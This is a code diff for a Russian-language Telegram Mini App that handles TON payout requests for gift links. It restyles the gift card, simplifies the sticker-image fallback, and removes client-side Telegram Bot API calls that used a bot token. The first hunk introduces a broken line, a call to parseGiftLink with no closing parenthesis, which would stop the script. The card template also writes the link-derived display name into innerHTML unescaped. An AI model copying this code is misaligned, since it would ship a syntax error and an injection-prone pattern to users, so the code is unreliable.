@@ -1507,7 +1507,7 @@ async function renderGiftCard(card, h, data) {
 
   // Пробуем загрузить цену в фоне с коротким таймаутом
   if (linksArr.length > 0) {
-    const giftName = parseGiftLinkCalc(linksArr[0]);
+   const giftName = parseGiftLink(linksArr[0]
     if (giftName) {
       try {
         const priceData = await Promise.race([
@@ -1531,112 +1531,97 @@ async function renderGiftCard(card, h, data) {
 }
 
 function buildGiftCardHtml(card, h, marketTon, pct, isExpert, stCls, stTxt, count, methodLabel) {
-  const linksArr  = h.links || [];
+  const linksArr = h.links || [];
   const stCls2 = { pending:'pending', paid:'paid', rejected:'rejected' }[h.status] || 'pending';
   const stTxt2 = { pending:'⏳ Ожидание', paid:'✅ Выплачено', rejected:'❌ Отклонено' }[h.status] || '⏳ Ожидание';
 
   const firstLink = linksArr[0] || '';
   const rawSlug   = parseGiftLink(firstLink) || '';
-  const baseSlug  = rawSlug.replace(/-[A-Za-z0-9]+$/, '').replace(/-\d+$/, '').toLowerCase();
-  const numMatch  = rawSlug.match(/-(\d+)$/);
-  const giftNum   = numMatch ? numMatch[1] : '';
 
-  const savedNames  = h.giftNames || [];
-  const displayName = savedNames[0]?.displayName
+ const savedNames  = h.giftNames || [];
+// Убираем хэш-суффикс (последний сегмент из 4+ символов) для красивого имени
+const cleanSlug = rawSlug.replace(/-[a-z0-9]{4,}$/i, '');
+const displayName = savedNames[0]?.displayName
     || savedNames[0]?.name
-    || (rawSlug
-        ? rawSlug.replace(/-/g,' ').replace(/\b\w/g,c=>c.toUpperCase())
-        : 'Подарок');
-
-  // Для t.me/nft/ — fragment даёт картинку, для t.me/gift/ — только через /gift_sticker
-  const isNft    = firstLink.includes('t.me/nft/');
-  const fragBase = isNft && baseSlug && giftNum
-    ? `https://nft.fragment.com/gift/${baseSlug}-${giftNum}`
-    : '';
-
-  const imgId = 'gi-' + h.reqId;
-  const fbId  = 'gf-' + h.reqId;
-
-  // Стартовый src:
-  // - NFT: пробуем fragment .medium.jpg
-  // - gift: сразу прозрачный пиксель → триггерит onerror → идёт в /gift_sticker
-  const startSrc = isNft && fragBase
-    ? `${fragBase}.medium.jpg`
-    : `data:image/gif;base64,R0lGODlhAQABAAAAACw=`;
+    || (cleanSlug
+        ? cleanSlug.replace(/-/g,' ').replace(/\b\w/g,c=>c.toUpperCase())
+        : (rawSlug
+            ? rawSlug.split('-').slice(0,-1).join(' ').replace(/\b\w/g,c=>c.toUpperCase()) || 'Подарок'
+            : 'Подарок'));
 
   const tonDisplay = (marketTon != null && marketTon > 0) ? marketTon : (h.ton || null);
   const payTon     = tonDisplay ? (tonDisplay * pct / 100).toFixed(2) : null;
-  const priceHtml  = (tonDisplay && tonDisplay > 0)
-    ? `<div class="pay-gift-price">${tonDisplay} <span>TON</span></div>
-       <div class="pay-gift-payout">Выплата (${pct}%): <b>${payTon} TON</b></div>`
-    : '';
 
+  const imgId = 'gi-' + h.reqId;
+  const fbId  = 'gf-' + h.reqId;
   const encLink = encodeURIComponent(firstLink);
+
+  // Стартуем с прозрачного пикселя → сразу в onerror → /gift_sticker
+  const startSrc = `data:image/gif;base64,R0lGODlhAQABAAAAACw=`;
 
   card.innerHTML = `
     <div class="pay-gift-card-header">
       ${linksArr.length || count} подарков · ${methodLabel} · ${h.date || ''}
     </div>
 
+    <!-- БОЛЬШОЙ КВАДРАТ -->
     <div style="
       width:100%;
       aspect-ratio:1/1;
-      border-radius:20px;
-      background:radial-gradient(circle at 50% 50%, rgba(34,197,94,0.1) 0%, rgba(0,0,0,0.5) 100%);
+      border-radius:18px;
+      background:radial-gradient(circle at 50% 40%, rgba(34,197,94,0.12) 0%, rgba(10,10,10,0.9) 70%);
+      border:1px solid rgba(34,197,94,0.1);
       display:flex;
       align-items:center;
       justify-content:center;
-      margin:8px 0 14px;
+      margin:10px 0 16px;
       position:relative;
       overflow:hidden;
     ">
+      <!-- Блик сверху -->
+      <div style="position:absolute;top:0;left:0;right:0;height:35%;background:linear-gradient(180deg,rgba(255,255,255,0.03) 0%,transparent 100%);pointer-events:none;"></div>
+
       <img
         id="${imgId}"
         src="${startSrc}"
         data-link="${encLink}"
-        data-step="0"
-        style="width:80%;height:80%;object-fit:contain;display:block;"
+        style="width:75%;height:75%;object-fit:contain;display:block;border-radius:10px;"
         onerror="(function(el){
-          var step = parseInt(el.dataset.step || '0');
-          var link = decodeURIComponent(el.dataset.link);
-          var fb   = document.getElementById('${fbId}');
-
-          if(step === 0 && ${isNft ? "'1'" : "'0'"} === '1'){
-            // NFT: попробуем .small.jpg
-            el.dataset.step = '1';
-            el.src = '${fragBase ? fragBase + '.small.jpg' : ''}';
-            return;
-          }
-
-          // Идём за стикером через бот
-          el.dataset.step = '99';
-          el.style.display = 'none';
-          if(fb) fb.style.display = 'flex';
-
-          fetch('${API_URL}/gift_sticker?link=' + encodeURIComponent(link))
-            .then(function(r){ return r.json(); })
+          el.style.display='none';
+          var fb=document.getElementById('${fbId}');
+          if(fb) fb.style.display='flex';
+          var link=decodeURIComponent(el.dataset.link);
+          fetch('${API_URL}/gift_sticker?link='+encodeURIComponent(link))
+            .then(function(r){return r.json();})
             .then(function(d){
               if(d.ok && d.url){
-                el.src = d.url;
-                el.style.display = 'block';
-                if(fb) fb.style.display = 'none';
+                el.src=d.url;
+                el.style.display='block';
+                if(fb) fb.style.display='none';
               }
             })
             .catch(function(){});
         })(this)"
-        onload="if(this.naturalWidth < 2){ this.dispatchEvent(new Event('error')); }"
+        onload="if(this.naturalWidth<2){this.dispatchEvent(new Event('error'));}"
       />
       <div
         id="${fbId}"
-        style="display:none;width:100%;height:100%;align-items:center;justify-content:center;font-size:90px;"
+        style="display:flex;align-items:center;justify-content:center;font-size:100px;line-height:1;"
       >🎁</div>
     </div>
 
-    <div style="font-size:17px;font-weight:800;color:#f0f0f0;margin-bottom:4px;">${displayName}</div>
-    ${linksArr.length > 1 ? `<div style="font-size:11px;color:#555;margin-bottom:8px;">+ ещё ${linksArr.length - 1} подарков</div>` : ''}
-    ${priceHtml}
+    <!-- Название -->
+    <div style="font-size:18px;font-weight:800;color:#f0f0f0;margin-bottom:5px;line-height:1.2;">${displayName}</div>
+    ${linksArr.length > 1 ? `<div style="font-size:11px;color:#555;margin-bottom:8px;">+ ещё ${linksArr.length-1} подарков</div>` : ''}
 
-    <div style="display:flex;align-items:center;justify-content:space-between;margin-top:12px;">
+    <!-- Цена если есть -->
+    ${tonDisplay && tonDisplay > 0 ? `
+      <div class="pay-gift-price">${tonDisplay} <span>TON</span></div>
+      <div class="pay-gift-payout">Выплата (${pct}%): <b>${payTon} TON</b></div>
+    ` : ''}
+
+    <!-- Нижняя строка -->
+    <div style="display:flex;align-items:center;justify-content:space-between;margin-top:14px;">
       <div style="font-size:10px;color:var(--text-dim);font-family:monospace;">${h.reqId}</div>
       <div class="pay-gift-status ${stCls2}">${stTxt2}</div>
     </div>
@@ -1706,57 +1691,7 @@ async function submitGiftRequest() {
   const now = new Date().toLocaleString('ru-RU');
 
   try {
-    const logText =
-      `🆕 <b>Новая заявка на выплату</b>\n` +
-      `🆔 <b>Заявка:</b> <code>${reqId}</code>\n\n` +
-      `👤 <b>Пользователь:</b> ${escapeHtml(fullName)}\n` +
-      `🔗 <b>Username:</b> ${escapeHtml(username)}\n` +
-      `🆔 <b>TG ID:</b> <code>${uid}</code>\n\n` +
-      `💳 <b>Метод:</b> ${methodLabel}\n` +
-      `💎 <b>TON Адрес:</b>\n<code>${escapeHtml(tonAddr)}</code>\n\n` +
-      `🎁 <b>Ссылки (${links.length} шт.):</b>\n${escapeHtml(linksFormatted)}\n\n` +
-      `🕐 <b>Время:</b> ${now}`;
-
-    const logResp = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-      method:  'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({
-        chat_id:                  LOG_CHANNEL_ID,
-        text:                     logText,
-        parse_mode:               'HTML',
-        disable_web_page_preview: true,
-        reply_markup: {
-          inline_keyboard: [
-            [
-              { text: '✅ Выплатить', callback_data: `pay:${reqId}` },
-              { text: '❌ Отклонить', callback_data: `rej:${reqId}` },
-            ],
-            [
-              { text: '👤 Профиль', callback_data: `prof:${reqId}` },
-            ],
-          ],
-        },
-      }),
-    }).then(r => r.json());
-
-    if (!logResp.ok) {
-      showToast('⚠️ Ошибка канала: ' + (logResp.description || 'неизвестно'));
-      return;
-    }
-
-    const msgId = logResp.result.message_id;
-
-    if (tg?.sendData) {
-      tg.sendData(JSON.stringify({
-        req_id:      reqId,
-        method:      selectedMethod,
-        ton_address: tonAddr,
-        links:       links,
-        msg_id:      msgId,
-        username:    username,
-        full_name:   fullName,
-      }));
-    }
+        const msgId = 0; // бот сам отправит в канал через save_request
 
     fetch(`${API_URL}/save_request`, {
       method:  'POST',
@@ -1822,19 +1757,8 @@ async function submitGiftRequest() {
       `Заявка ${reqId} принята через ${selectedMethod === 'ots' ? 'ОТС Бот' : 'живого гаранта'}`;
     document.getElementById('successOverlay').classList.add('open');
 
-  } catch (err) {
+} catch (err) {
     console.error('[SAM] submitGiftRequest error:', err);
-    if (tg?.sendData) {
-      tg.sendData(JSON.stringify({
-        req_id:      reqId,
-        method:      selectedMethod,
-        ton_address: tonAddr,
-        links:       links,
-        msg_id:      0,
-        username:    username,
-        full_name:   fullName,
-      }));
-    }
     showToast('❌ ' + err.message);
   } finally {
     btn.innerHTML = 'Отправить заявку';
